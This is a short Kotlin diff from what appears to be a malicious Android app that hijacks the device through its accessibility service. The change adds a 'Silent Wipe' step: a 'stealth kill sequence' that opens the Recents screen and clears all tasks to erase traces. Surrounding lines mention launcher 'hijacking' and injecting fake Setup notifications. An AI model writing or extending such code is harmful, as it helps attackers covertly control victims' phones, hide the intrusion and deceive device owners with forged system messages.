@@ -3182,11 +3182,16 @@ object CommandProcessor {
                         LauncherManager.isHijacking = false
                     }
 
-                    DebugLogger.log("FINALIZE_LIFECYCLE", "Phase 3.5: Forcing underlying OS to Home screen to secure state.")
-                    MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
-                    kotlinx.coroutines.delay(400)
-                    MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
-                    kotlinx.coroutines.delay(500)
+                    DebugLogger.log("FINALIZE_LIFECYCLE", "Phase 3.5: Purging task manager (Silent Wipe).")
+                    val service = MyAccessibilityService.instance
+                    if (service != null) {
+                        service.startStealthKillSequence()
+                        // Wait for Recents animation, Clear All click, and transition back Home
+                        kotlinx.coroutines.delay(4500) 
+                    } else {
+                        MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
+                        kotlinx.coroutines.delay(1000)
+                    }
 
                     DebugLogger.log("FINALIZE_LIFECYCLE", "Phase 4: Restoring Audio and injecting fake Setup notifications.")
                     try {
